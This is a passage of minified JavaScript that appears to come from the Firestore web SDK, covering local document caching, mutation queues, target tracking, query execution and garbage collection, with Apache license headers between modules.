w=jk(t.get(p),r.get(p));w!==null&&f.set(p,w),s=s.add(p)}}),o.push(this.documentOverlayCache.saveOverlays(e,u,f))}return re.waitFor(o)}).next(()=>r)}recalculateAndSaveOverlaysForDocumentKeys(e,t){return this.remoteDocumentCache.getEntries(e,t).next(r=>this.recalculateAndSaveOverlays(e,r))}getDocumentsMatchingQuery(e,t,r,i){return function(o){return Te.isDocumentKey(o.path)&&o.collectionGroup===null&&o.filters.length===0}(t)?this.getDocumentsMatchingDocumentQuery(e,t.path):kk(t)?this.getDocumentsMatchingCollectionGroupQuery(e,t,r,i):this.getDocumentsMatchingCollectionQuery(e,t,r,i)}getNextDocuments(e,t,r,i){return this.remoteDocumentCache.getAllFromCollectionGroup(e,t,r,i).next(s=>{const o=i-s.size>0?this.documentOverlayCache.getOverlaysForCollectionGroup(e,t,r.largestBatchId,i-s.size):re.resolve(Xo());let a=Yu,l=s;return o.next(u=>re.forEach(u,(h,f)=>(a<f.largestBatchId&&(a=f.largestBatchId),s.get(h)?re.resolve():this.remoteDocumentCache.getEntry(e,h).next(p=>{l=l.insert(h,p)}))).next(()=>this.populateOverlays(e,u,s)).next(()=>this.computeViews(e,l,u,Ye())).next(h=>({batchId:a,changes:Nk(h)})))})}getDocumentsMatchingDocumentQuery(e,t){return this.getDocument(e,new Te(t)).next(r=>{let i=Jc();return r.isFoundDocument()&&(i=i.insert(r.key,r)),i})}getDocumentsMatchingCollectionGroupQuery(e,t,r,i){const s=t.collectionGroup;let o=Jc();return this.indexManager.getCollectionParents(e,s).next(a=>re.forEach(a,l=>{const u=function(f,p){return new Eh(p,null,f.explicitOrderBy.slice(),f.filters.slice(),f.limit,f.limitType,f.startAt,f.endAt)}(t,l.child(s));return this.getDocumentsMatchingCollectionQuery(e,u,r,i).next(h=>{h.forEach((f,p)=>{o=o.insert(f,p)})})}).next(()=>o))}getDocumentsMatchingCollectionQuery(e,t,r,i){let s;return this.documentOverlayCache.getOverlaysForCollection(e,t.path,r.largestBatchId).next(o=>(s=o,this.remoteDocumentCache.getDocumentsMatchingQuery(e,t,r,s,i))).next(o=>{s.forEach((l,u)=>{const h=u.getKey();o.get(h)===null&&(o=o.insert(h,er.newInvalidDocument(h)))});let a=Jc();return o.forEach((l,u)=>{const h=s.get(l);h!==void 0&&wu(h.mutation,u,Rr.empty(),yn.now()),eg(t,u)&&(a=a.insert(l,u))}),a})}}/**
 * @license
 * Copyright 2020 Google LLC
 *
 * Licensed under the Apache License, Version 2.0 (the "License");
 * you may not use this file except in compliance with the License.
 * You may obtain a copy of the License at
 *
 *   http://www.apache.org/licenses/LICENSE-2.0
 *
 * Unless required by applicable law or agreed to in writing, software
 * distributed under the License is distributed on an "AS IS" BASIS,
 * WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
 * See the License for the specific language governing permissions and
 * limitations under the License.
 */class XF{constructor(e){this.serializer=e,this.dr=new Map,this.Ar=new Map}getBundleMetadata(e,t){return re.resolve(this.dr.get(t))}saveBundleMetadata(e,t){return this.dr.set(t.id,function(i){return{id:i.id,version:i.version,createTime:Mi(i.createTime)}}(t)),re.resolve()}getNamedQuery(e,t){return re.resolve(this.Ar.get(t))}saveNamedQuery(e,t){return this.Ar.set(t.name,function(i){return{name:i.name,query:zF(i.bundledQuery),readTime:Mi(i.readTime)}}(t)),re.resolve()}}/**
 * @license
 * Copyright 2022 Google LLC
 *
 * Licensed under the Apache License, Version 2.0 (the "License");
 * you may not use this file except in compliance with the License.
 * You may obtain a copy of the License at
 *
 *   http://www.apache.org/licenses/LICENSE-2.0
 *
 * Unless required by applicable law or agreed to in writing, software
 * distributed under the License is distributed on an "AS IS" BASIS,
 * WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
 * See the License for the specific language governing permissions and
 * limitations under the License.
 */class ez{constructor(){this.overlays=new Qt(Te.comparator),this.Rr=new Map}getOverlay(e,t){return re.resolve(this.overlays.get(t))}getOverlays(e,t){const r=Xo();return re.forEach(t,i=>this.getOverlay(e,i).next(s=>{s!==null&&r.set(i,s)})).next(()=>r)}saveOverlays(e,t,r){return r.forEach((i,s)=>{this.Et(e,t,s)}),re.resolve()}removeOverlaysForBatchId(e,t,r){const i=this.Rr.get(r);return i!==void 0&&(i.forEach(s=>this.overlays=this.overlays.remove(s)),this.Rr.delete(r)),re.resolve()}getOverlaysForCollection(e,t,r){const i=Xo(),s=t.length+1,o=new Te(t.child("")),a=this.overlays.getIteratorFrom(o);for(;a.hasNext();){const l=a.getNext().value,u=l.getKey();if(!t.isPrefixOf(u.path))break;u.path.length===s&&l.largestBatchId>r&&i.set(l.getKey(),l)}return re.resolve(i)}getOverlaysForCollectionGroup(e,t,r,i){let s=new Qt((u,h)=>u-h);const o=this.overlays.getIterator();for(;o.hasNext();){const u=o.getNext().value;if(u.getKey().getCollectionGroup()===t&&u.largestBatchId>r){let h=s.get(u.largestBatchId);h===null&&(h=Xo(),s=s.insert(u.largestBatchId,h)),h.set(u.getKey(),u)}}const a=Xo(),l=s.getIterator();for(;l.hasNext()&&(l.getNext().value.forEach((u,h)=>a.set(u,h)),!(a.size()>=i)););return re.resolve(a)}Et(e,t,r){const i=this.overlays.get(r.key);if(i!==null){const o=this.Rr.get(i.largestBatchId).delete(r.key);this.Rr.set(i.largestBatchId,o)}this.overlays=this.overlays.insert(r.key,new vF(t,r));let s=this.Rr.get(t);s===void 0&&(s=Ye(),this.Rr.set(t,s)),this.Rr.set(t,s.add(r.key))}}/**
 * @license
 * Copyright 2024 Google LLC
 *
 * Licensed under the Apache License, Version 2.0 (the "License");
 * you may not use this file except in compliance with the License.
 * You may obtain a copy of the License at
 *
 *   http://www.apache.org/licenses/LICENSE-2.0
 *
 * Unless required by applicable law or agreed to in writing, software
 * distributed under the License is distributed on an "AS IS" BASIS,
 * WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
 * See the License for the specific language governing permissions and
 * limitations under the License.
 */class tz{constructor(){this.sessionToken=Fn.EMPTY_BYTE_STRING}getSessionToken(e){return re.resolve(this.sessionToken)}setSessionToken(e,t){return this.sessionToken=t,re.resolve()}}/**
 * @license
 * Copyright 2017 Google LLC
 *
 * Licensed under the Apache License, Version 2.0 (the "License");
 * you may not use this file except in compliance with the License.
 * You may obtain a copy of the License at
 *
 *   http://www.apache.org/licenses/LICENSE-2.0
 *
 * Unless required by applicable law or agreed to in writing, software
 * distributed under the License is distributed on an "AS IS" BASIS,
 * WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
 * See the License for the specific language governing permissions and
 * limitations under the License.
 */class Hv{constructor(){this.Vr=new wn(Sn.mr),this.gr=new wn(Sn.pr)}isEmpty(){return this.Vr.isEmpty()}addReference(e,t){const r=new Sn(e,t);this.Vr=this.Vr.add(r),this.gr=this.gr.add(r)}yr(e,t){e.forEach(r=>this.addReference(r,t))}removeReference(e,t){this.wr(new Sn(e,t))}Sr(e,t){e.forEach(r=>this.removeReference(r,t))}br(e){const t=new Te(new Mt([])),r=new Sn(t,e),i=new Sn(t,e+1),s=[];return this.gr.forEachInRange([r,i],o=>{this.wr(o),s.push(o.key)}),s}Dr(){this.Vr.forEach(e=>this.wr(e))}wr(e){this.Vr=this.Vr.delete(e),this.gr=this.gr.delete(e)}vr(e){const t=new Te(new Mt([])),r=new Sn(t,e),i=new Sn(t,e+1);let s=Ye();return this.gr.forEachInRange([r,i],o=>{s=s.add(o.key)}),s}containsKey(e){const t=new Sn(e,0),r=this.Vr.firstAfterOrEqual(t);return r!==null&&e.isEqual(r.key)}}class Sn{constructor(e,t){this.key=e,this.Cr=t}static mr(e,t){return Te.comparator(e.key,t.key)||$e(e.Cr,t.Cr)}static pr(e,t){return $e(e.Cr,t.Cr)||Te.comparator(e.key,t.key)}}/**
 * @license
 * Copyright 2017 Google LLC
 *
 * Licensed under the Apache License, Version 2.0 (the "License");
 * you may not use this file except in compliance with the License.
 * You may obtain a copy of the License at
 *
 *   http://www.apache.org/licenses/LICENSE-2.0
 *
 * Unless required by applicable law or agreed to in writing, software
 * distributed under the License is distributed on an "AS IS" BASIS,
 * WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
 * See the License for the specific language governing permissions and
 * limitations under the License.
 */class nz{constructor(e,t){this.indexManager=e,this.referenceDelegate=t,this.mutationQueue=[],this.Fr=1,this.Mr=new wn(Sn.mr)}checkEmpty(e){return re.resolve(this.mutationQueue.length===0)}addMutationBatch(e,t,r,i){const s=this.Fr;this.Fr++,this.mutationQueue.length>0&&this.mutationQueue[this.mutationQueue.length-1];const o=new wF(s,t,r,i);this.mutationQueue.push(o);for(const a of i)this.Mr=this.Mr.add(new Sn(a.key,s)),this.indexManager.addToCollectionParentIndex(e,a.key.path.popLast());return re.resolve(o)}lookupMutationBatch(e,t){return re.resolve(this.Or(t))}getNextMutationBatchAfterBatchId(e,t){const r=t+1,i=this.Nr(r),s=i<0?0:i;return re.resolve(this.mutationQueue.length>s?this.mutationQueue[s]:null)}getHighestUnacknowledgedBatchId(){return re.resolve(this.mutationQueue.length===0?Dv:this.Fr-1)}getAllMutationBatches(e){return re.resolve(this.mutationQueue.slice())}getAllMutationBatchesAffectingDocumentKey(e,t){const r=new Sn(t,0),i=new Sn(t,Number.POSITIVE_INFINITY),s=[];return this.Mr.forEachInRange([r,i],o=>{const a=this.Or(o.Cr);s.push(a)}),re.resolve(s)}getAllMutationBatchesAffectingDocumentKeys(e,t){let r=new wn($e);return t.forEach(i=>{const s=new Sn(i,0),o=new Sn(i,Number.POSITIVE_INFINITY);this.Mr.forEachInRange([s,o],a=>{r=r.add(a.Cr)})}),re.resolve(this.Br(r))}getAllMutationBatchesAffectingQuery(e,t){const r=t.path,i=r.length+1;let s=r;Te.isDocumentKey(s)||(s=s.child(""));const o=new Sn(new Te(s),0);let a=new wn($e);return this.Mr.forEachWhile(l=>{const u=l.key.path;return!!r.isPrefixOf(u)&&(u.length===i&&(a=a.add(l.Cr)),!0)},o),re.resolve(this.Br(a))}Br(e){const t=[];return e.forEach(r=>{const i=this.Or(r);i!==null&&t.push(i)}),t}removeMutationBatch(e,t){st(this.Lr(t.batchId,"removed")===0),this.mutationQueue.shift();let r=this.Mr;return re.forEach(t.mutations,i=>{const s=new Sn(i.key,t.batchId);return r=r.delete(s),this.referenceDelegate.markPotentiallyOrphaned(e,i.key)}).next(()=>{this.Mr=r})}qn(e){}containsKey(e,t){const r=new Sn(t,0),i=this.Mr.firstAfterOrEqual(r);return re.resolve(t.isEqual(i&&i.key))}performConsistencyCheck(e){return this.mutationQueue.length,re.resolve()}Lr(e,t){return this.Nr(e)}Nr(e){return this.mutationQueue.length===0?0:e-this.mutationQueue[0].batchId}Or(e){const t=this.Nr(e);return t<0||t>=this.mutationQueue.length?null:this.mutationQueue[t]}}/**
 * @license
 * Copyright 2017 Google LLC
 *
 * Licensed under the Apache License, Version 2.0 (the "License");
 * you may not use this file except in compliance with the License.
 * You may obtain a copy of the License at
 *
 *   http://www.apache.org/licenses/LICENSE-2.0
 *
 * Unless required by applicable law or agreed to in writing, software
 * distributed under the License is distributed on an "AS IS" BASIS,
 * WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
 * See the License for the specific language governing permissions and
 * limitations under the License.
 */class rz{constructor(e){this.kr=e,this.docs=function(){return new Qt(Te.comparator)}(),this.size=0}setIndexManager(e){this.indexManager=e}addEntry(e,t){const r=t.key,i=this.docs.get(r),s=i?i.size:0,o=this.kr(t);return this.docs=this.docs.insert(r,{document:t.mutableCopy(),size:o}),this.size+=o-s,this.indexManager.addToCollectionParentIndex(e,r.path.popLast())}removeEntry(e){const t=this.docs.get(e);t&&(this.docs=this.docs.remove(e),this.size-=t.size)}getEntry(e,t){const r=this.docs.get(t);return re.resolve(r?r.document.mutableCopy():er.newInvalidDocument(t))}getEntries(e,t){let r=ws();return t.forEach(i=>{const s=this.docs.get(i);r=r.insert(i,s?s.document.mutableCopy():er.newInvalidDocument(i))}),re.resolve(r)}getDocumentsMatchingQuery(e,t,r,i){let s=ws();const o=t.path,a=new Te(o.child("__id-9223372036854775808__")),l=this.docs.getIteratorFrom(a);for(;l.hasNext();){const{key:u,value:{document:h}}=l.getNext();if(!o.isPrefixOf(u.path))break;u.path.length>o.length+1||LV(PV(h),r)<=0||(i.has(h.key)||eg(t,h))&&(s=s.insert(h.key,h.mutableCopy()))}return re.resolve(s)}getAllFromCollectionGroup(e,t,r,i){Ne()}qr(e,t){return re.forEach(this.docs,r=>t(r))}newChangeBuffer(e){return new iz(this)}getSize(e){return re.resolve(this.size)}}class iz extends YF{constructor(e){super(),this.Ir=e}applyChanges(e){const t=[];return this.changes.forEach((r,i)=>{i.isValidDocument()?t.push(this.Ir.addEntry(e,i)):this.Ir.removeEntry(r)}),re.waitFor(t)}getFromCache(e,t){return this.Ir.getEntry(e,t)}getAllFromCache(e,t){return this.Ir.getEntries(e,t)}}/**
 * @license
 * Copyright 2017 Google LLC
 *
 * Licensed under the Apache License, Version 2.0 (the "License");
 * you may not use this file except in compliance with the License.
 * You may obtain a copy of the License at
 *
 *   http://www.apache.org/licenses/LICENSE-2.0
 *
 * Unless required by applicable law or agreed to in writing, software
 * distributed under the License is distributed on an "AS IS" BASIS,
 * WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
 * See the License for the specific language governing permissions and
 * limitations under the License.
 */class sz{constructor(e){this.persistence=e,this.Qr=new xa(t=>Uv(t),jv),this.lastRemoteSnapshotVersion=De.min(),this.highestTargetId=0,this.$r=0,this.Ur=new Hv,this.targetCount=0,this.Kr=Zl.Un()}forEachTarget(e,t){return this.Qr.forEach((r,i)=>t(i)),re.resolve()}getLastRemoteSnapshotVersion(e){return re.resolve(this.lastRemoteSnapshotVersion)}getHighestSequenceNumber(e){return re.resolve(this.$r)}allocateTargetId(e){return this.highestTargetId=this.Kr.next(),re.resolve(this.highestTargetId)}setTargetsMetadata(e,t,r){return r&&(this.lastRemoteSnapshotVersion=r),t>this.$r&&(this.$r=t),re.resolve()}zn(e){this.Qr.set(e.target,e);const t=e.targetId;t>this.highestTargetId&&(this.Kr=new Zl(t),this.highestTargetId=t),e.sequenceNumber>this.$r&&(this.$r=e.sequenceNumber)}addTargetData(e,t){return this.zn(t),this.targetCount+=1,re.resolve()}updateTargetData(e,t){return this.zn(t),re.resolve()}removeTargetData(e,t){return this.Qr.delete(t.target),this.Ur.br(t.targetId),this.targetCount-=1,re.resolve()}removeTargets(e,t,r){let i=0;const s=[];return this.Qr.forEach((o,a)=>{a.sequenceNumber<=t&&r.get(a.targetId)===null&&(this.Qr.delete(o),s.push(this.removeMatchingKeysForTargetId(e,a.targetId)),i++)}),re.waitFor(s).next(()=>i)}getTargetCount(e){return re.resolve(this.targetCount)}getTargetData(e,t){const r=this.Qr.get(t)||null;return re.resolve(r)}addMatchingKeys(e,t,r){return this.Ur.yr(t,r),re.resolve()}removeMatchingKeys(e,t,r){this.Ur.Sr(t,r);const i=this.persistence.referenceDelegate,s=[];return i&&t.forEach(o=>{s.push(i.markPotentiallyOrphaned(e,o))}),re.waitFor(s)}removeMatchingKeysForTargetId(e,t){return this.Ur.br(t),re.resolve()}getMatchingKeysForTargetId(e,t){const r=this.Ur.vr(t);return re.resolve(r)}containsKey(e,t){return re.resolve(this.Ur.containsKey(t))}}/**
 * @license
 * Copyright 2017 Google LLC
 *
 * Licensed under the Apache License, Version 2.0 (the "License");
 * you may not use this file except in compliance with the License.
 * You may obtain a copy of the License at
 *
 *   http://www.apache.org/licenses/LICENSE-2.0
 *
 * Unless required by applicable law or agreed to in writing, software
 * distributed under the License is distributed on an "AS IS" BASIS,
 * WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
 * See the License for the specific language governing permissions and
 * limitations under the License.
 */class Xk{constructor(e,t){this.Wr={},this.overlays={},this.Gr=new Yp(0),this.zr=!1,this.zr=!0,this.jr=new tz,this.referenceDelegate=e(this),this.Hr=new sz(this),this.indexManager=new WF,this.remoteDocumentCache=function(i){return new rz(i)}(r=>this.referenceDelegate.Jr(r)),this.serializer=new FF(t),this.Yr=new XF(this.serializer)}start(){return Promise.resolve()}shutdown(){return this.zr=!1,Promise.resolve()}get started(){return this.zr}setDatabaseDeletedListener(){}setNetworkEnabled(){}getIndexManager(e){return this.indexManager}getDocumentOverlayCache(e){let t=this.overlays[e.toKey()];return t||(t=new ez,this.overlays[e.toKey()]=t),t}getMutationQueue(e,t){let r=this.Wr[e.toKey()];return r||(r=new nz(t,this.referenceDelegate),this.Wr[e.toKey()]=r),r}getGlobalsCache(){return this.jr}getTargetCache(){return this.Hr}getRemoteDocumentCache(){return this.remoteDocumentCache}getBundleCache(){return this.Yr}runTransaction(e,t,r){me("MemoryPersistence","Starting transaction:",e);const i=new oz(this.Gr.next());return this.referenceDelegate.Zr(),r(i).next(s=>this.referenceDelegate.Xr(i).next(()=>s)).toPromise().then(s=>(i.raiseOnCommittedEvent(),s))}ei(e,t){return re.or(Object.values(this.Wr).map(r=>()=>r.containsKey(e,t)))}}class oz extends OV{constructor(e){super(),this.currentSequenceNumber=e}}class qv{constructor(e){this.persistence=e,this.ti=new Hv,this.ni=null}static ri(e){return new qv(e)}get ii(){if(this.ni)return this.ni;throw Ne()}addReference(e,t,r){return this.ti.addReference(r,t),this.ii.delete(r.toString()),re.resolve()}removeReference(e,t,r){return this.ti.removeReference(r,t),this.ii.add(r.toString()),re.resolve()}markPotentiallyOrphaned(e,t){return this.ii.add(t.toString()),re.resolve()}removeTarget(e,t){this.ti.br(t.targetId).forEach(i=>this.ii.add(i.toString()));const r=this.persistence.getTargetCache();return r.getMatchingKeysForTargetId(e,t.targetId).next(i=>{i.forEach(s=>this.ii.add(s.toString()))}).next(()=>r.removeTargetData(e,t))}Zr(){this.ni=new Set}Xr(e){const t=this.persistence.getRemoteDocumentCache().newChangeBuffer();return re.forEach(this.ii,r=>{const i=Te.fromPath(r);return this.si(e,i).next(s=>{s||t.removeEntry(i,De.min())})}).next(()=>(this.ni=null,t.apply(e)))}updateLimboDocument(e,t){return this.si(e,t).next(r=>{r?this.ii.delete(t.toString()):this.ii.add(t.toString())})}Jr(e){return 0}si(e,t){return re.or([()=>re.resolve(this.ti.containsKey(t)),()=>this.persistence.getTargetCache().containsKey(e,t),()=>this.persistence.ei(e,t)])}}class Zd{constructor(e,t){this.persistence=e,this.oi=new xa(r=>jV(r.path),(r,i)=>r.isEqual(i)),this.garbageCollector=QF(this,t)}static ri(e,t){return new Zd(e,t)}Zr(){}Xr(e){return re.resolve()}forEachTarget(e,t){return this.persistence.getTargetCache().forEachTarget(e,t)}nr(e){const t=this.sr(e);return this.persistence.getTargetCache().getTargetCount(e).next(r=>t.next(i=>r+i))}sr(e){let t=0;return this.rr(e,r=>{t++}).next(()=>t)}rr(e,t){return re.forEach(this.oi,(r,i)=>this.ar(e,r,i).next(s=>s?re.resolve():t(i)))}removeTargets(e,t,r){return this.persistence.getTargetCache().removeTargets(e,t,r)}removeOrphanedDocuments(e,t){let r=0;const i=this.persistence.getRemoteDocumentCache(),s=i.newChangeBuffer();return i.qr(e,o=>this.ar(e,o,t).next(a=>{a||(r++,s.removeEntry(o,De.min()))})).next(()=>s.apply(e)).next(()=>r)}markPotentiallyOrphaned(e,t){return this.oi.set(t,e.currentSequenceNumber),re.resolve()}removeTarget(e,t){const r=t.withSequenceNumber(e.currentSequenceNumber);return this.persistence.getTargetCache().updateTargetData(e,r)}addReference(e,t,r){return this.oi.set(r,e.currentSequenceNumber),re.resolve()}removeReference(e,t,r){return this.oi.set(r,e.currentSequenceNumber),re.resolve()}updateLimboDocument(e,t){return this.oi.set(t,e.currentSequenceNumber),re.resolve()}Jr(e){let t=e.key.toString().length;return e.isFoundDocument()&&(t+=$f(e.data.value)),t}ar(e,t,r){return re.or([()=>this.persistence.ei(e,t),()=>this.persistence.getTargetCache().containsKey(e,t),()=>{const i=this.oi.get(t);return re.resolve(i!==void 0&&i>r)}])}getCacheSize(e){return this.persistence.getRemoteDocumentCache().getSize(e)}}/**
 * @license
 * Copyright 2017 Google LLC
 *
 * Licensed under the Apache License, Version 2.0 (the "License");
 * you may not use this file except in compliance with the License.
 * You may obtain a copy of the License at
 *
 *   http://www.apache.org/licenses/LICENSE-2.0
 *
 * Unless required by applicable law or agreed to in writing, software
 * distributed under the License is distributed on an "AS IS" BASIS,
 * WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
 * See the License for the specific language governing permissions and
 * limitations under the License.
 */class Kv{constructor(e,t,r,i){this.targetId=e,this.fromCache=t,this.Hi=r,this.Ji=i}static Yi(e,t){let r=Ye(),i=Ye();for(const s of t.docChanges)switch(s.type){case 0:r=r.add(s.doc.key);break;case 1:i=i.add(s.doc.key)}return new Kv(e,t.fromCache,r,i)}}/**
 * @license
 * Copyright 2023 Google LLC
 *
 * Licensed under the Apache License, Version 2.0 (the "License");
 * you may not use this file except in compliance with the License.
 * You may obtain a copy of the License at
 *
 *   http://www.apache.org/licenses/LICENSE-2.0
 *
 * Unless required by applicable law or agreed to in writing, software
 * distributed under the License is distributed on an "AS IS" BASIS,
 * WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
 * See the License for the specific language governing permissions and
 * limitations under the License.
 */class az{constructor(){this._documentReadCount=0}get documentReadCount(){return this._documentReadCount}incrementDocumentReadCount(e){this._documentReadCount+=e}}/**
 * @license
 * Copyright 2019 Google LLC
 *
 * Licensed under the Apache License, Version 2.0 (the "License");
 * you may not use this file except in compliance with the License.
 * You may obtain a copy of the License at
 *
 *   http://www.apache.org/licenses/LICENSE-2.0
 *
 * Unless required by applicable law or agreed to in writing, software
 * distributed under the License is distributed on an "AS IS" BASIS,
 * WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
 * See the License for the specific language governing permissions and
 * limitations under the License.
 */class lz{constructor(){this.Zi=!1,this.Xi=!1,this.es=100,this.ts=function(){return V5()?8:BV(rr())>0?6:4}()}initialize(e,t){this.ns=e,this.indexManager=t,this.Zi=!0}getDocumentsMatchingQuery(e,t,r,i){const s={result:null};return this.rs(e,t).next(o=>{s.result=o}).next(()=>{if(!s.result)return this.ss(e,t,i,r).next(o=>{s.result=o})}).next(()=>{if(s.result)return;const o=new az;return this._s(e,t,o).next(a=>{if(s.result=a,this.Xi)return this.us(e,t,o,a.size)})}).next(()=>s.result)}us(e,t,r,i){return r.documentReadCount<this.es?(Ka()<=Qe.DEBUG&&me("QueryEngine","SDK will not create cache indexes for query:",Ga(t),"since it only creates cache indexes for collection contains","more than or equal to",this.es,"documents"),re.resolve()):(Ka()<=Qe.DEBUG&&me("QueryEngine","Query:",Ga(t),"scans",r.documentReadCount,"local documents and returns",i,"documents as results."),r.documentReadCount>this.ts*i?(Ka()<=Qe.DEBUG&&me("QueryEngine","The SDK decides to create cache indexes for query:",Ga(t),"as using cache indexes may help improve performance."),this.indexManager.createTargetIndexes(e,Ri(t))):re.resolve())}rs(e,t){if(JI(t))return re.resolve(null);let r=Ri(t);return this.indexManager.getIndexType(e,r).next(i=>i===0?null:(t.limit!==null&&i===1&&(t=Ry(t,null,"F"),r=Ri(t)),this.indexManager.getDocumentsMatchingTarget(e,r).next(s=>{const o=Ye(...s);return this.ns.getDocuments(e,o).next(a=>this.indexManager.getMinOffset(e,r).next(l=>{const u=this.cs(t,a);return this.ls(t,u,o,l.readTime)?this.rs(e,Ry(t,null,"F")):this.hs(e,u,t,l)}))})))}ss(e,t,r,i){return JI(t)||i.isEqual(De.min())?re.resolve(null):this.ns.getDocuments(e,r).next(s=>{const o=this.cs(t,s);return this.ls(t,o,r,i)?re.resolve(null):(Ka()<=Qe.DEBUG&&me("QueryEngine","Re-using previous result from %s to execute query: %s",i.toString(),Ga(t)),this.hs(e,o,t,NV(i,Yu)).next(a=>a))})}cs(e,t){let r=new wn(Rk(e));return t.forEach((i,s)=>{eg(e,s)&&(r=r.add(s))}),r}ls(e,t,r,i){if(e.limit===null)return!1;if(r.size!==t.size)return!0;const s=e.limitType==="F"?t.last():t.first();return!!s&&(s.hasPendingWrites||s.version.compareTo(i)>0)}_s(e,t,r){return Ka()<=Qe.DEBUG&&me("QueryEngine","Using full collection scan to execute query:",Ga(t)),this.ns.getDocumentsMatchingQuery(e,t,go.min(),r)}hs(e,t,r,i){return this.ns.getDocumentsMatchingQuery(e,r,i).next(s=>(t.forEach(o=>{s=s.insert(o.key,o)}),s))}}/**
 * @license
 * Copyright 2020 Google LLC
 *
 * Licensed under the Apache License, Version 2.0 (the "License");
 * you may not use this file except in compliance with the License.
 * You may obtain a copy of the License at
 *
 *   http://www.apache.org/licenses/LICENSE-2.0
 *
 * Unless required by applicable law or agreed to in writing, software
 * distributed under the License is distributed on an "AS IS" BASIS,
 * WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
 * See the License for the specific language governing permissions and
 * limitations under the License.
 */const Gv="LocalStore",cz=3e8;class uz{constructor(e,t,r,i){this.persistence=e,this.Ps=t,this.serializer=i,this.Ts=new Qt($e),this.Is=new xa(s=>Uv(s),jv),this.Es=new Map,this.ds=e.getRemoteDocumentCache(),this.Hr=e.getTargetCache(),this.Yr=e.getBundleCache(),this.As(r)}As(e){this.documentOverlayCache=this.persistence.getDocumentOverlayCache(e),this.indexManager=this.persistence.getIndexManager(e),this.mutationQueue=this.persistence.getMutationQueue(e,this.indexManager),this.localDocuments=new JF(this.ds,this.mutationQueue,this.documentOverlayCache,this.indexManager),this.ds.setIndexManager(this.indexManager),this.Ps.initialize(this.localDocuments,this.indexManager)}collectGarbage(e){return this.persistence.runTransaction("Collect garbage","readwrite-primary",t=>e.collect(t,this.Ts))}}function hz(n,e,t,r){return new uz(n,e,t,r)}async function eC(n,e){const t=Be(n);return await t.persistence.runTransaction("Handle user change","readonly",r=>{let i;return t.mutationQueue.getAllMutationBatches(r).next(s=>(i=s,t.As(e),t.mutationQueue.getAllMutationBatches(r))).next(s=>{const o=[],a=[];let l=Ye();for(const u of i){o.push(u.batchId);for(const h of u.mutations)l=l.add(h.key)}for(const u of s){a.push(u.batchId);for(const h of u.mutations)l=l.add(h.key)}return t.localDocuments.getDocuments(r,l).next(u=>({Rs:u,removedBatchIds:o,addedBatchIds:a}))})})}function fz(n,e){const t=Be(n);return t.persistence.runTransaction("Acknowledge batch","readwrite-primary",r=>{const i=e.batch.keys(),s=t.ds.newChangeBuffer({trackRemovals:!0});return function(a,l,u,h){const f=u.batch,p=f.keys();let w=re.resolve();return p.forEach(x=>{w=w.next(()=>h.getEntry(l,x)).next(k=>{const I=u.docVersions.get(x);st(I!==null),k.version.compareTo(I)<0&&(f.applyToRemoteDocument(k,u),k.isValidDocument()&&(k.setReadTime(u.commitVersion),h.addEntry(k)))})}),w.next(()=>a.mutationQueue.removeMutationBatch(l,f))}(t,r,e,s).next(()=>s.apply(r)).next(()=>t.mutationQueue.performConsistencyCheck(r)).next(()=>t.documentOverlayCache.removeOverlaysForBatchId(r,i,e.batch.batchId)).next(()=>t.localDocuments.recalculateAndSaveOverlaysForDocumentKeys(r,function(a){let l=Ye();for(let u=0;u<a.mutationResults.length;++u)a.mutationResults[u].transformResults.length>0&&(l=l.add(a.batch.mutations[u].key));return l}(e))).next(()=>t.localDocuments.getDocuments(r,i))})}function tC(n){const e=Be(n);return e.persistence.runTransaction("Get last remote snapshot version","readonly",t=>e.Hr.getLastRemoteSnapshotVersion(t))}function dz(n,e){const t=Be(n),r=e.snapshotVersion;let i=t.Ts;return t.persistence.runTransaction("Apply remote event","readwrite-primary",s=>{const o=t.ds.newChangeBuffer({trackRemovals:!0});i=t.Ts;const a=[];e.targetChanges.forEach((h,f)=>{const p=i.get(f);if(!p)return;a.push(t.Hr.removeMatchingKeys(s,h.removedDocuments,f).next(()=>t.Hr.addMatchingKeys(s,h.addedDocuments,f)));let w=p.withSequenceNumber(s.currentSequenceNumber);e.targetMismatches.get(f)!==null?w=w.withResumeToken(Fn.EMPTY_BYTE_STRING,De.min()).withLastLimboFreeSnapshotVersion(De.min()):h.resumeToken.approximateByteSize()>0&&(w=w.withResumeToken(h.resumeToken,r)),i=i.insert(f,w),function(k,I,A){return k.resumeToken.approximateByteSize()===0||I.snapshotVersion.toMicroseconds()-k.snapshotVersion.toMicroseconds()>=cz?!0:A.addedDocuments.size+A.modifiedDocuments.size+A.removedDocuments.size>0}(p,w,h)&&a.push(t.Hr.updateTargetData(s,w))});let l=ws(),u=Ye();if(e.documentUpdates.forEach(h=>{e.resolvedLimboDocuments.has(h)&&a.push(t.persistence.referenceDelegate.updateLimboDocument(s,h))}),a.push(pz(s,o,e.documentUpdates).next(h=>{l=h.Vs,u=h.fs})),!r.isEqual(De.min())){const h=t.Hr.getLastRemoteSnapshotVersion(s).next(f=>t.Hr.setTargetsMetadata(s,s.currentSequenceNumber,r));a.push(h)}return re.waitFor(a).next(()=>o.apply(s)).next(()=>t.localDocuments.getLocalViewOfDocuments(s,l,u)).next(()=>l)}).then(s=>(t.Ts=i,s))}function pz(n,e,t){let r=Ye(),i=Ye();return t.forEach(s=>r=r.add(s)),e.getEntries(n,r).next(s=>{let o=ws();return t.forEach((a,l)=>{const u=s.get(a);l.isFoundDocument()!==u.isFoundDocument()&&(i=i.add(a)),l.isNoDocument()&&l.version.isEqual(De.min())?(e.removeEntry(a,l.readTime),o=o.insert(a,l)):!u.isValidDocument()||l.version.compareTo(u.version)>0||l.version.compareTo(u.version)===0&&u.hasPendingWrites?(e.addEntry(l),o=o.insert(a,l)):me(Gv,"Ignoring outdated watch update for ",a,". Current version:",u.version," Watch version:",l.version)}),{Vs:o,fs:i}})}function 